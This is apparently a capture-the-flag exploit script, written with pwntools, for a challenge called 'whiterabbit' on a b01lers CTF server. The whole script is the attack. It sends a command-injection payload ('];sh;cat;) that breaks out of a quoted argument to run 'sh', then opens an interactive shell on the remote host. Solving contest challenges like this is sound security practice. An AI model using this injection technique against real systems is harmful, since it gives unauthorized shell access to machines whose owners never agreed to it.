from pwn import *


#p = process("./whiterabbit")
p = remote("chal.ctf.b01lers.com",1013)

payload = '\'];sh;cat;'

#gdb.attach(p)
p.sendline(payload)

p.interactive()
